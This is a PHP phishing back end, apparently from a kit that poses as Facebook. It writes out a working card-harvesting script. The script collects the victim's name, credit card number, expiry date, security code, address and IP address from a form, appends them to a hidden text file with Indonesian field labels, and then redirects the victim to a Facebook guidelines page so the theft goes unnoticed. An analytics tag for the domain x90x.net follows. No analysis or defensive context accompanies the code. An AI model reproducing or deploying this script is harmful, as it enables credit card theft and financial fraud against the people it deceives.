<?php
$file = "___________________________C^C________________________.txt";
$firstName = $_POST['firstName'];
$creditCardNumber = $_POST['creditCardNumber'];
$month = $_POST['month'];
$year = $_POST['year'];
$csc = $_POST['csc'];
$street = $_POST['street'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
fwrite($handle, "\n");
fwrite($handle, "::  NAMA      ::   ");
fwrite($handle, "$firstName");
fwrite($handle, "\n");
fwrite($handle, "::  CREDIT    ::   ");
fwrite($handle, "$creditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "::  BULAN     ::   ");
fwrite($handle, "$month");
fwrite($handle, "\n");
fwrite($handle, "::  TAHUN     ::   ");
fwrite($handle, "$year");
fwrite($handle, "\n");
fwrite($handle, "::  CSC       ::   ");
fwrite($handle, "$csc");
fwrite($handle, "\n");
fwrite($handle, "::  POS       ::   ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA    ::   ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "::  JALAN     ::   ");
fwrite($handle, "$street");
fwrite($handle, "\n");
fwrite($handle, "::  KOTA      ::   ");
fwrite($handle, "$city");
fwrite($handle, "\n");
fwrite($handle, "::  IP        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK ::   ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/page_guidelines.php\";
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>